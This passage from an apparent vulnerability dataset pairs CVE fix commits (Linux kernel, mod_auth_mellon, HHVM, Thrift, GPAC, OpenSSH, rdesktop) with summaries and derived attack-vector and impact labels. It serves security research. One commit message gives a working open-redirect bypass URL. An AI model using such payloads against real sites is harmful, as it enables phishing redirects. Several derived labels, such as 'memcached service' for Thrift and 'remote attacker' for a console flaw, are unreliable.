<akpm@linux-foundation.org>\nCc: Greg KH <gregkh@linuxfoundation.org>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Michal Hocko <mhocko@suse.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The mincore() implementation in mm\/mincore.c in the Linux kernel through 4.19.13 allowed local attackers to observe page cache access patterns of other processes on the same system, potentially allowing sniffing of secret information. (Fixing this affects the output of the fincore program.) Limited remote exploitation may be possible, as demonstrated by latency differences in accessing public files from an Apache HTTP Server.","commit_message_1":"change mincore ( ) to count `` mapped '' page rather than `` cached '' page the semantics of what `` in core '' mean for the mincore ( ) system call are somewhat unclear , but linux ha always ( since <file>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"latency differences in accessing public files from an Apache HTTP Server","Impact":"obtain sensitive information","Root Cause":"caused by a new side channel attack on the mincore() implementation","Attack Type":"local attacker"},{"commit_id":"62041428a32de402e0be6ba45fe12df6a83bedb8","cve_id":"CVE-2019-3877","cwe_id":"CWE-601","commit_message":"Fix redirect URL validation bypass\n\nIt turns out that browsers silently convert backslash characters into\nforward slashes, while apr_uri_parse() does not.\n\nThis mismatch allows an attacker to bypass the redirect URL validation\nby using an URL like:\n\n  https:\/\/sp.example.org\/mellon\/logout?ReturnTo=https:%5c%5cmalicious.example.org\/\n\nmod_auth_mellon will assume that it is a relative URL and allow the\nrequest to pass through, while the browsers will use it as an absolute\nurl and redirect to https:\/\/malicious.example.org\/ .\n\nThis patch fixes this issue by rejecting all redirect URLs with\nbackslashes.","summary":"A vulnerability was found in mod_auth_mellon before v0.14.2. An open redirect in the logout URL allows requests with backslashes to pass through by assuming that it is a relative URL, while the browsers silently convert backslash characters into forward slashes treating them as an absolute URL. This mismatch allows an attacker to bypass the redirect URL validation logic in apr_uri_parse function.","commit_message_1":"fix redirect url validation bypass it turn out that browser silently convert backslash character into forward slash , while apr_uri_parse ( ) doe not","Vulnerability Type":"Open Redirect","Attack Vector":"by assuming that it is a relative url , while the browsers silently convert backslash characters into forward slashes treating them as an absolute url .","Impact":"redirect a victim to arbitrary Web sites","Root Cause":"caused by an open redirect vulnerability","Attack Type":"remote attacker"},{"commit_id":"e3a5d056633677959ad924a51758876d415e7046","cve_id":"CVE-2019-3817","cwe_id":"CWE-416","commit_message":"Fix UAF in comps_objmrtree_unite function\n\nThe added field is not used at all in many places and it is probably the\nleft-over of some copy-paste.","summary":"A use-after-free flaw has been discovered in libcomps before version 0.1.10 in the way ObjMRTrees are merged. An attacker, who is able to make an application read a crafted comps XML file, may be able to crash the application or execute malicious code.","commit_message_1":"fix uaf in comps_objmrtree_unite function the added field is not used at all in many place and it is probably the left-over of some copy-paste","Vulnerability Type":"Use After Free","Attack Vector":"By persuading an application to read a specially-crafted file","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free","Attack Type":"attacker"},{"commit_id":"97ef580ec2cca9a54da6f9bd9fdd9a455f6d74ed","cve_id":"CVE-2019-3569","cwe_id":"CWE-200","commit_message":"Fix default FastCGI interface\n\nReviewed By: alexeyt\n\nDifferential Revision: D15567393\n\nfbshipit-source-id: ffab228f689d4ddca9ea4835c70aecf16da2aa9f","summary":"HHVM, when used with FastCGI, would bind by default to all available interfaces. This behavior could allow a malicious individual unintended direct access to the application, which could result in information disclosure. This issue affects versions 4.3.0, 4.4.0, 4.5.0, 4.6.0, 4.7.0, 4.8.0, versions 3.30.5 and below, and all versions in the 4.0, 4.1, and 4.2 series.","commit_message_1":"fix default fastcgi interface","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"would bind by default to all available interfaces","Impact":"obtain sensitive information","Root Cause":"caused by a flaw when used with FastCGI","Attack Type":"remote attacker"},{"commit_id":"01686e15ec77ccb4d49a77d5bce3a01601e54d64","cve_id":"CVE-2019-3565","cwe_id":"CWE-20","commit_message":"Throw on skipping an invalid type.\n\nSummary:\nCertain values (e.g.) T_STOP should not appear as a skip type. Allowing them to\ncan cause thrift to loop unboundedly.\n\nReviewed By: spalamarchuk\n\nDifferential Revision: D15102451\n\nfbshipit-source-id: c08d52f44f37e9c212d3480233ac217105586c9f","summary":"Legacy C++ Facebook Thrift servers (using cpp instead of cpp2) would not error upon receiving messages with containers of fields of unknown type. As a result, malicious clients could send short messages which would take a long time for the server to parse, potentially leading to denial of service. This issue affects Facebook Thrift prior to v2019.05.06.00.","commit_message_1":"throw on skipping an invalid type","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending a specially-crafted message to the memcached service","Impact":"cause a denial of service","Root Cause":"caused by improper handling of messages","Attack Type":"remote attacker"},{"commit_id":"5b3bceca875e4ea4ed9d14c20b20ce46c92c13c6","cve_id":"CVE-2019-3563","cwe_id":"CWE-119","commit_message":"Peek for \\n in LineBasedFrameDecoder.\n\nSummary:\nPreviously this could underflow if there was not a following \\n.\n\nCVE-2019-3563\n\nReviewed By: siyengar\n\nDifferential Revision: D14935715\n\nfbshipit-source-id: 25c3eecf373f89efa1232456aeeb092f13b7fa06","summary":"Wangle's LineBasedFrameDecoder contains logic for identifying newlines which incorrectly advances a buffer, leading to a potential underflow. This affects versions of Wangle prior to v2019.04.22.00","commit_message_1":"peek for \\n in linebasedframedecoder","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"execute arbitrary code","Root Cause":"contains logic for identifying newlines which incorrectly advances a buffer , leading to a potential underflow","Attack Type":"remote attacker"},{"commit_id":"46003b4ab564b2abcd8470035fc324fe36aa8c75","cve_id":"CVE-2019-3561","cwe_id":"CWE-125","commit_message":"Prevent strrpos and strripos from visiting out-of-bounds memory.\n\nReviewed By: alexeyt\n\nDifferential Revision: D14669668\n\nfbshipit-source-id: 16bb4674bccf83ffd737e60d1fd9fd4a0093f77c","summary":"Insufficient boundary checks for the strrpos and strripos functions allow access to out-of-bounds memory. This affects all supported versions of HHVM (4.0.3, 3.30.4, and 3.27.7 and below).","commit_message_1":"prevent strrpos and strripos from visiting out-of-bounds memory","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds read flaw","Attack Type":"remote attacker"},{"commit_id":"40bbb161e72fb609608d53b9d64c56bb961a6ee2","cve_id":"CVE-2019-3560","cwe_id":"CWE-119","commit_message":"Avoid arithmetic operation on uint16 read from the wire.\n\nSummary:\nThis could overflow previously.\n\nCVE-2019-3560\n\nReviewed By: yfeldblum\n\nDifferential Revision: D14152362\n\nfbshipit-source-id: c0ebb3fc59b49c7c23e6bcb90458c19cd891be65","summary":"An improperly performed length calculation on a buffer in PlaintextRecordLayer could lead to an infinite loop and denial-of-service based on user input. This issue affected versions of fizz prior to v2019.03.04.00.","commit_message_1":"avoid arithmetic operation on uint16 read from the wire","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially crafted message via TCP","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"c5d6e07588cd03061bc54d451a7fa6e84883d62b","cve_id":"CVE-2019-3558","cwe_id":"CWE-20","commit_message":"Throw on bad types during skipping data\n\nSummary:\nThe current code silently returns on bad types. In case when we have an invalid data, we may get a container of a large size with a bad type, this would lead to us running long loop doing nothing (though we already can say that the data is invalid).\n\nThe new code would throw an exception as soon as we try to skip a value of invalid type.\n\nFixes CVE-2019-3552\n\nReviewed By: yfeldblum, stevegury\n\nDifferential Revision: D8344920\n\nfbshipit-source-id: f12e8f3442f7ad5e1a81d822380701e929b80f0d","summary":"Python Facebook Thrift servers would not error upon receiving messages with containers of fields of unknown type. As a result, malicious clients could send short messages which would take a long time for the server to parse, potentially leading to denial of service. This issue affects Facebook Thrift prior to v2019.02.18.00.","commit_message_1":"throw on bad type during skipping data summary : the current code silently return on bad type","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending a specially-crafted message to the memcached service","Impact":"cause a denial of service","Root Cause":"would not error upon receiving messages with containers of fields of unknown type . as a result , malicious clients could send short messages which would take a long time for the server to parse , potentially leading to denial of service","Attack Type":"remote attacker"},{"commit_id":"6e4dd9ec3f14b48170fc45dc9d13a3261765f994","cve_id":"CVE-2019-3557","cwe_id":"CWE-125","commit_message":"CVE-2019-3557: Fix OOB read in readRecord on BZ2Files\/OutputFiles\n\nSummary:\nThese File subclasses return -1 on read errors which is not what is\nexpected for readImpl--this made File::readRecord behave unusually if the read\nfails, causing it to read (size_t)(-1) bytes from its stream buffer; which,\nunsurprisingly produces a out-of-bounds heap read.\n\nReviewed By: leikahing, jjgriego\n\nDifferential Revision: D13659395\n\nfbshipit-source-id: 359ed6e3ff9f9cf49b752b666f51c4e0b3ce4b8a","summary":"The implementations of streams for bz2 and php:\/\/output improperly implemented their readImpl functions, returning -1 consistently. This behavior caused some stream functions, such as stream_get_line, to trigger an out-of-bounds read when operating on such malformed streams. The implementations were updated to return valid values consistently. This affects all supported versions of HHVM (3.30 and 3.27.4 and below).","commit_message_1":"fix oob read in readrecord on bz2files\/outputfiles summary : these file subclass return -<number> on read error which is not what is expected for readimpl -- this made file : :readrecord behave unusually if the read fails , causing it to read ( size_t ) ( -<number> ) byte from it stream buffer ; which , unsurprisingly produce a out-of-bounds heap read","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By using malformed streams","Impact":"execute arbitrary code","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"3b17ba10a82c71e7808760e027ac6af687e06074","cve_id":"CVE-2019-3554","cwe_id":"CWE-19","commit_message":"AcceptRoutingHandler should not assume a folly::AsyncSocket\n\nSummary:\nThere is no reason to perform a cast to folly::AsyncSocket, when all of the\nrequired behavior is in folly::AsyncTransportWrapper.\n\nCVE-2019-3554\n\nReviewed By: avasylev\n\nDifferential Revision: D13599212\n\nfbshipit-source-id: 3bb5475fe464c04cf5c04115f34e1bcf237cb4aa","summary":"Wangle's AcceptRoutingHandler incorrectly casts a socket when accepting a TLS 1.3 connection, leading to a potential denial of service attack against systems accepting such connections. This affects versions of Wangle prior to v2019.01.14.00","commit_message_1":"acceptroutinghandler should not assume a folly : :asyncsocket summary : there is no reason to perform a cast to folly : :asyncsocket , when all of the required behavior is in folly : :asynctransportwrapper","Vulnerability Type":"Data Processing Errors","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"d2371b4b204f0a3c0af51ad4e9b491144dd1225c","cve_id":"CVE-2018-21017","cwe_id":"CWE-400","commit_message":"prevent dref memleak on invalid input (#1183)","summary":"GPAC 0.7.1 has a memory leak in dinf_Read in isomedia\/box_code_base.c.","commit_message_1":"prevent dref memleak on invalid input ( # <number> )","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"2e5ab1d9987831c981ff05862e8ccf1381ed58ea","cve_id":"CVE-2018-21010","cwe_id":"CWE-119","commit_message":"color_apply_icc_profile: avoid potential heap buffer overflow\n\nDerived from a patch by Thuan Pham","summary":"OpenJPEG before 2.3.1 has a heap buffer overflow in color_apply_icc_profile in bin\/common\/color.c.","commit_message_1":"avoid potential heap buffer overflow derived from a patch by thuan pham","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"overflow a buffer to execute arbitrary code","Root Cause":"caused by improper bounds checking by the color_apply_icc_profile","Attack Type":"remote attacker"},{"commit_id":"7fafcfdf6377b18b2a726ea554d6e593ba44349f","cve_id":"CVE-2018-20961","cwe_id":"CWE-415","commit_message":"USB: gadget: f_midi: fixing a possible double-free in f_midi\n\nIt looks like there is a possibility of a double-free vulnerability on an\nerror path of the f_midi_set_alt function in the f_midi driver. If the\npath is feasible then free_ep_req gets called twice:\n\n         req->complete = f_midi_complete;\n         err = usb_ep_queue(midi->out_ep, req, GFP_ATOMIC);\n            => ...\n             usb_gadget_giveback_request\n               =>\n                 f_midi_complete (CALLBACK)\n                   (inside f_midi_complete, for various cases of status)\n                   free_ep_req(ep, req); \/\/ first kfree\n         if (err) {\n                 ERROR(midi, \"%s: couldn't enqueue request: %d\\n\",\n                             midi->out_ep->name, err);\n                 free_ep_req(midi->out_ep, req); \/\/ second kfree\n                 return err;\n         }\n\nThe double-free possibility was introduced with commit ad0d1a058eac\n(\"usb: gadget: f_midi: fix leak on failed to enqueue out requests\").\n\nFound by MOXCAFE tool.\n\nSigned-off-by: Tuba Yavuz <tuba@ece.ufl.edu>\nFixes: ad0d1a058eac (\"usb: gadget: f_midi: fix leak on failed to enqueue out requests\")\nAcked-by: Felipe Balbi <felipe.balbi@linux.intel.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"In the Linux kernel before 4.16.4, a double free vulnerability in the f_midi_set_alt function of drivers\/usb\/gadget\/function\/f_midi.c in the f_midi driver may allow attackers to cause a denial of service or possibly have unspecified other impact.","commit_message_1":"gadget : f_midi : fixing a possible double-free in f_midi it look like there is a possibility of a double-free vulnerability on an error path of the f_midi_set_alt function in the f_midi driver","Vulnerability Type":"double free","Attack Vector":"a double free vulnerability in the f_midi_set_alt function of drivers\/usb\/gadget\/function\/f_midi.c","Impact":"cause a denial of service","Root Cause":"caused by a double free","Attack Type":"local attacker"},{"commit_id":"54648cf1ec2d7f4b6a71767799c45676a138ca24","cve_id":"CVE-2018-20856","cwe_id":"CWE-416","commit_message":"block: blk_init_allocated_queue() set q->fq as NULL in the fail case\n\nWe find the memory use-after-free issue in __blk_drain_queue()\non the kernel 4.14. After read the latest kernel 4.18-rc6 we\nthink it has the same problem.\n\nMemory is allocated for q->fq in the blk_init_allocated_queue().\nIf the elevator init function called with error return, it will\nrun into the fail case to free the q->fq.\n\nThen the __blk_drain_queue() uses the same memory after the free\nof the q->fq, it will lead to the unpredictable event.\n\nThe patch is to set q->fq as NULL in the fail case of\nblk_init_allocated_queue().\n\nFixes: commit 7c94e1c157a2 (\"block: introduce blk_flush_queue to drive flush machinery\")\nCc: <stable@vger.kernel.org>\nReviewed-by: Ming Lei <ming.lei@redhat.com>\nReviewed-by: Bart Van Assche <bart.vanassche@wdc.com>\nSigned-off-by: xiao jin <jin.xiao@intel.com>\nSigned-off-by: Jens Axboe <axboe@kernel.dk>","summary":"An issue was discovered in the Linux kernel before 4.18.7. In block\/blk-core.c, there is an __blk_drain_queue() use-after-free because a certain error case is mishandled.","commit_message_1":"blk_init_allocated_queue ( ) set q- > fq a null in the fail case we find the memory use-after-free issue in __blk_drain_queue ( ) on the kernel <file>","Vulnerability Type":"Use After Free","Attack Vector":"improper error checking in the __blk_drain_queue","Impact":"perform unspecified actions","Root Cause":"caused by improper error checking","Attack Type":"attacker"},{"commit_id":"6acb47d1a318e5b3b7115354ebc4ea060c59d3a1","cve_id":"CVE-2018-20854","cwe_id":"CWE-125","commit_message":"phy: ocelot-serdes: fix out-of-bounds read\n\nCurrently, there is an out-of-bounds read on array ctrl->phys,\nonce variable i reaches the maximum array size of SERDES_MAX\nin the for loop.\n\nFix this by changing the condition in the for loop from\ni <= SERDES_MAX to i < SERDES_MAX.\n\nAddresses-Coverity-ID: 1473966 (\"Out-of-bounds read\")\nAddresses-Coverity-ID: 1473959 (\"Out-of-bounds read\")\nFixes: 51f6b410fc22 (\"phy: add driver for Microsemi Ocelot SerDes muxing\")\nReviewed-by: Quentin Schulz <quentin.schulz@bootlin.com>\nSigned-off-by: Gustavo A. R. Silva <gustavo@embeddedor.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"An issue was discovered in the Linux kernel before 4.20. drivers\/phy\/mscc\/phy-ocelot-serdes.c has an off-by-one error with a resultant ctrl->phys out-of-bounds read.","commit_message_1":"ocelot-serdes : fix out-of-bounds read currently , there is an out-of-bounds read on array ctrl- > phys , once variable i reach the maximum array size of serdes_max in the for loop","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"with a resultant ctrl->phys out-of-bounds read","Impact":"obtain sensitive information","Root Cause":"caused by an out-of-bounds read","Attack Type":"local attacker"},{"commit_id":"9725f1a10f80f5e0ae7d9b60547458622aeb322f","cve_id":"CVE-2018-20839","cwe_id":"CWE-255","commit_message":"Merge pull request #12378 from rbalint\/vt-kbd-reset-check\n\nVT kbd reset check","summary":"systemd 242 changes the VT1 mode upon a logout, which allows attackers to read cleartext passwords in certain circumstances, such as watching a shutdown, or using Ctrl-Alt-F1 and Ctrl-Alt-F2. This occurs because the KDGKBMODE (aka current keyboard mode) check is mishandled.","commit_message_1":"merge pull request # <number> from rbalint\/vt-kbd-reset-check","Vulnerability Type":"Credentials Management Errors","Attack Vector":"By using Ctrl-Alt-F1 and Ctrl-Alt-F2","Impact":"obtain sensitive information","Root Cause":"caused by mishandling KDGKBMODE (aka current keyboard mode) check","Attack Type":"remote attacker"},{"commit_id":"b90cd6f2b905905fb42671009dc0e27c310a16ae","cve_id":"CVE-2018-20836","cwe_id":"CWE-416","commit_message":"scsi: libsas: fix a race condition when smp task timeout\n\nWhen the lldd is processing the complete sas task in interrupt and set the\ntask stat as SAS_TASK_STATE_DONE, the smp timeout timer is able to be\ntriggered at the same time. And smp_task_timedout() will complete the task\nwheter the SAS_TASK_STATE_DONE is set or not. Then the sas task may freed\nbefore lldd end the interrupt process. Thus a use-after-free will happen.\n\nFix this by calling the complete() only when SAS_TASK_STATE_DONE is not\nset. And remove the check of the return value of the del_timer(). Once the\nLLDD sets DONE, it must call task->done(), which will call\nsmp_task_done()->complete() and the task will be completed and freed\ncorrectly.\n\nReported-by: chenxiang <chenxiang66@hisilicon.com>\nSigned-off-by: Jason Yan <yanaijie@huawei.com>\nCC: John Garry <john.garry@huawei.com>\nCC: Johannes Thumshirn <jthumshirn@suse.de>\nCC: Ewan Milne <emilne@redhat.com>\nCC: Christoph Hellwig <hch@lst.de>\nCC: Tomas Henzl <thenzl@redhat.com>\nCC: Dan Williams <dan.j.williams@intel.com>\nCC: Hannes Reinecke <hare@suse.com>\nReviewed-by: Hannes Reinecke <hare@suse.com>\nReviewed-by: John Garry <john.garry@huawei.com>\nReviewed-by: Johannes Thumshirn <jthumshirn@suse.de>\nSigned-off-by: Martin K. Petersen <martin.petersen@oracle.com>","summary":"An issue was discovered in the Linux kernel before 4.20. There is a race condition in smp_task_timedout() and smp_task_done() in drivers\/scsi\/libsas\/sas_expander.c, leading to a use-after-free.","commit_message_1":"libsas : fix a race condition when smp task timeout when the lldd is processing the complete sa task in interrupt and set the task stat a sas_task_state_done , the smp timeout timer is able to be triggered at the same time","Vulnerability Type":"Use After Free","Attack Vector":"a race condition in smp_task_timedout() and smp_task_done() in drivers\/scsi\/libsas\/sas_expander.c","Impact":"cause a denial of service","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"c40f7d74c741a907cfaeb73a7697081881c497d0","cve_id":"CVE-2018-20784","cwe_id":"CWE-400","commit_message":"sched\/fair: Fix infinite loop in update_blocked_averages() by reverting a9e7f6544b9c\n\nZhipeng Xie, Xie XiuQi and Sargun Dhillon reported lockups in the\nscheduler under high loads, starting at around the v4.18 time frame,\nand Zhipeng Xie tracked it down to bugs in the rq->leaf_cfs_rq_list\nmanipulation.\n\nDo a (manual) revert of:\n\n  a9e7f6544b9c (\"sched\/fair: Fix O(nr_cgroups) in load balance path\")\n\nIt turns out that the list_del_leaf_cfs_rq() introduced by this commit\nis a surprising property that was not considered in followup commits\nsuch as:\n\n  9c2791f936ef (\"sched\/fair: Fix hierarchical order in rq->leaf_cfs_rq_list\")\n\nAs Vincent Guittot explains:\n\n \"I think that there is a bigger problem with commit a9e7f6544b9c and\n  cfs_rq throttling:\n\n  Let take the example of the following topology TG2 --> TG1 --> root:\n\n   1) The 1st time a task is enqueued, we will add TG2 cfs_rq then TG1\n      cfs_rq to leaf_cfs_rq_list and we are sure to do the whole branch in\n      one path because it has never been used and can't be throttled so\n      tmp_alone_branch will point to leaf_cfs_rq_list at the end.\n\n   2) Then TG1 is throttled\n\n   3) and we add TG3 as a new child of TG1.\n\n   4) The 1st enqueue of a task on TG3 will add TG3 cfs_rq just before TG1\n      cfs_rq and tmp_alone_branch will stay  on rq->leaf_cfs_rq_list.\n\n  With commit a9e7f6544b9c, we can del a cfs_rq from rq->leaf_cfs_rq_list.\n  So if the load of TG1 cfs_rq becomes NULL before step 2) above, TG1\n  cfs_rq is removed from the list.\n  Then at step 4), TG3 cfs_rq is added at the beginning of rq->leaf_cfs_rq_list\n  but tmp_alone_branch still points to TG3 cfs_rq because its throttled\n  parent can't be enqueued when the lock is released.\n  tmp_alone_branch doesn't point to rq->leaf_cfs_rq_list whereas it should.\n\n  So if TG3 cfs_rq is removed or destroyed before tmp_alone_branch\n  points on another TG cfs_rq, the next TG cfs_rq that will be added,\n  will be linked outside rq->leaf_cfs_rq_list - which is bad.\n\n  In addition, we can break the ordering of the cfs_rq in\n  rq->leaf_cfs_rq_list but this ordering is used to update and\n  propagate the update from leaf down to root.\"\n\nInstead of trying to work through all these cases and trying to reproduce\nthe very high loads that produced the lockup to begin with, simplify\nthe code temporarily by reverting a9e7f6544b9c - which change was clearly\nnot thought through completely.\n\nThis (hopefully) gives us a kernel that doesn't lock up so people\ncan continue to enjoy their holidays without worrying about regressions. ;-)\n\n[ mingo: Wrote changelog, fixed weird spelling in code comment while at it. ]\n\nAnalyzed-by: Xie XiuQi <xiexiuqi@huawei.com>\nAnalyzed-by: Vincent Guittot <vincent.guittot@linaro.org>\nReported-by: Zhipeng Xie <xiezhipeng1@huawei.com>\nReported-by: Sargun Dhillon <sargun@sargun.me>\nReported-by: Xie XiuQi <xiexiuqi@huawei.com>\nTested-by: Zhipeng Xie <xiezhipeng1@huawei.com>\nTested-by: Sargun Dhillon <sargun@sargun.me>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nAcked-by: Vincent Guittot <vincent.guittot@linaro.org>\nCc: <stable@vger.kernel.org> # v4.13+\nCc: Bin Li <huawei.libin@huawei.com>\nCc: Mike Galbraith <efault@gmx.de>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Tejun Heo <tj@kernel.org>\nCc: Thomas Gleixner <tglx@linutronix.de>\nFixes: a9e7f6544b9c (\"sched\/fair: Fix O(nr_cgroups) in load balance path\")\nLink: http:\/\/lkml.kernel.org\/r\/1545879866-27809-1-git-send-email-xiexiuqi@huawei.com\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"In the Linux kernel before 4.20.2, kernel\/sched\/fair.c mishandles leaf cfs_rq's, which allows attackers to cause a denial of service (infinite loop in update_blocked_averages) or possibly have unspecified other impact by inducing a high load.","commit_message_1":"fix infinite loop in update_blocked_averages ( ) by reverting a9e7f6544b9c zhipeng xie , xie xiuqi and sargun dhillon reported lockup in the scheduler under high load , starting at around the <file> time frame , and zhipeng xie tracked it down to bug in the rq- > leaf_cfs_rq_list manipulation","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"by inducing a high load","Impact":"cause a denial of service ( infinite loop in update _ blocked _ averages ) or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"1c449a34fe0b50aaffb881bfb9d7c5ab0bb18cdd","cve_id":"CVE-2018-20763","cwe_id":"CWE-787","commit_message":"add some boundary checks on gf_text_get_utf8_line (#1188)","summary":"In GPAC 0.7.1 and earlier, gf_text_get_utf8_line in media_tools\/text_import.c in libgpac_static.a allows an out-of-bounds write because of missing szLineConv bounds checking.","commit_message_1":"add some boundary check on gf_text_get_utf8_line ( # <number> )","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"overflow a buffer and execute arbitrary code on the system","Root Cause":"caused by an out-of-bounds write flaw","Attack Type":"remote attacker"},{"commit_id":"35ab4475a7df9b2a4bcab235e379c0c3ec543658","cve_id":"CVE-2018-20762","cwe_id":"CWE-119","commit_message":"fix some overflows due to strcpy\n\nfixes #1184, #1186, #1187 among other things","summary":"GPAC version 0.7.1 and earlier has a buffer overflow vulnerability in the cat_multiple_files function in applications\/mp4box\/fileimport.c when MP4Box is used for a local directory containing crafted filenames.","commit_message_1":"fix some overflow due to strcpy","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the cat_multiple_files function","Attack Type":"remote attacker"},{"commit_id":"4c1360818fc8948e9307059fba4dc47ba8ad255d","cve_id":"CVE-2018-20760","cwe_id":"CWE-787","commit_message":"check error code on call to gf_utf8_wcstombs (#1177)","summary":"In GPAC 0.7.1 and earlier, gf_text_get_utf8_line in media_tools\/text_import.c in libgpac_static.a allows an out-of-bounds write because a certain -1 return value is mishandled.","commit_message_1":"check error code on call to gf_utf8_wcstombs ( # <number> )","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"5ddda15d89f5ac82f4416208c5319ace4aecdc36","cve_id":"CVE-2018-20742","cwe_id":null,"commit_message":"Check that ecall [user_check] pointers and ocall_malloc result pointer are outside enclave (#67)\n\nThis should reduce the enclave's attack surface by preventing an attacker from invoking ecalls on or triggering unexpected writes to arbitrary enclave memory, which could potentially leak information about that memory or lead to incorrect results.\n\nFixes #36. Fixes #66.","summary":"An issue was discovered in UC Berkeley RISE Opaque before 2018-12-01. There is no boundary check on ocall_malloc. The return value could be a pointer to enclave memory. It could cause an arbitrary enclave memory write.","commit_message_1":"check that ecall [ user_check ] pointer and ocall_malloc result pointer are outside enclave ( # <number> ) this should reduce the enclave 's attack surface by preventing an attacker from invoking ecalls on or triggering unexpected writes to arbitrary enclave memory , which could potentially leak information about that memory or lead to incorrect result","Vulnerability Type":"memory write","Attack Vector":"An issue was discovered in UC Berkeley RISE","Impact":"execute arbitrary code","Root Cause":"caused by lack of boundary check on ocall_malloc","Attack Type":"local attacker"},{"commit_id":"cef25028de5ff872c2e1f0a6c562eb3ea9ecbce4","cve_id":"CVE-2018-20721","cwe_id":"CWE-125","commit_message":"Fix uriParse*Ex* out-of-bounds read","summary":"URI_FUNC() in UriParse.c in uriparser before 0.9.1 has an out-of-bounds read (in uriParse*Ex* functions) for an incomplete URI with an IPv6 address containing an embedded IPv4 address, such as a *\/\/[::44.1* address.","commit_message_1":"fix uriparse * ex * out-of-bounds read","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By using a specially-crafted URI","Impact":"execute arbitrary code","Root Cause":"has an out - of - bounds read (","Attack Type":"remote attacker"},{"commit_id":"6010c0303a422a9c5fa8860c061bf7105eb7f8b2","cve_id":"CVE-2018-20685","cwe_id":"CWE-706","commit_message":"upstream: disallow empty incoming filename or ones that refer to the\n\ncurrent directory; based on report\/patch from Harry Sintonen\n\nOpenBSD-Commit-ID: f27651b30eaee2df49540ab68d030865c04f6de9","summary":"In OpenSSH 7.9, scp.c in the scp client allows remote SSH servers to bypass intended access restrictions via the filename of . or an empty filename. The impact is modifying the permissions of the target directory on the client side.","commit_message_1":"disallow empty incoming filename or one that refer to the current directory ; based on report\/patch from harry sintonen openbsd-commit-id : f27651b30eaee2df49540ab68d030865c04f6de9","Vulnerability Type":"Use of Incorrectly-Resolved Name or Reference\n","Attack Vector":"via the filename of . or an empty filename .","Impact":"bypass intended access restrictions","Root Cause":"caused by directory name validation by scp.c","Attack Type":"remote attacker"},{"commit_id":"49d876f2c5fc00bcedaa986a7cf6dedd6bf16f54","cve_id":"CVE-2018-20684","cwe_id":null,"commit_message":"Bug 1675: Prevent SCP server sending files that were not requested\n\nhttps:\/\/winscp.net\/tracker\/1675\n\nSource commit: 4aa587620973bf793fb6e783052277c0f7be4b55","summary":"In WinSCP before 5.14 beta, due to missing validation, the scp implementation would accept arbitrary files sent by the server, potentially overwriting unrelated files. This affects TSCPFileSystem::SCPSink in core\/ScpFileSystem.cpp.","commit_message_1":"prevent scp server sending file that were not requested http : \/\/<file>\/tracker\/<number> source commit : 4aa587620973bf793fb6e783052277c0f7be4b55","Vulnerability Type":"unspecified","Attack Vector":"The scp implementation accepts arbitrary files","Impact":"overwrite arbitrary files","Root Cause":"caused by missing received object name validation by the scp client","Attack Type":"remote attacker"},{"commit_id":"4dca546d04321a610c1835010b5dad85163b65e1","cve_id":"CVE-2018-20182","cwe_id":"CWE-119","commit_message":"Malicious RDP server security fixes\n\nThis commit includes fixes for a set of 21 vulnerabilities in\nrdesktop when a malicious RDP server is used.\n\nAll vulnerabilities was identified and reported by Eyal Itkin.\n\n * Add rdp_protocol_error function that is used in several fixes\n * Refactor of process_bitmap_updates\n * Fix possible integer overflow in s_check_rem() on 32bit arch\n * Fix memory corruption in process_bitmap_data - CVE-2018-8794\n * Fix remote code execution in process_bitmap_data - CVE-2018-8795\n * Fix remote code execution in process_plane - CVE-2018-8797\n * Fix Denial of Service in mcs_recv_connect_response - CVE-2018-20175\n * Fix Denial of Service in mcs_parse_domain_params - CVE-2018-20175\n * Fix Denial of Service in sec_parse_crypt_info - CVE-2018-20176\n * Fix Denial of Service in sec_recv - CVE-2018-20176\n * Fix minor information leak in rdpdr_process - CVE-2018-8791\n * Fix Denial of Service in cssp_read_tsrequest - CVE-2018-8792\n * Fix remote code execution in cssp_read_tsrequest - CVE-2018-8793\n * Fix Denial of Service in process_bitmap_data - CVE-2018-8796\n * Fix minor information leak in rdpsnd_process_ping - CVE-2018-8798\n * Fix Denial of Service in process_secondary_order - CVE-2018-8799\n * Fix remote code execution in in ui_clip_handle_data - CVE-2018-8800\n * Fix major information leak in 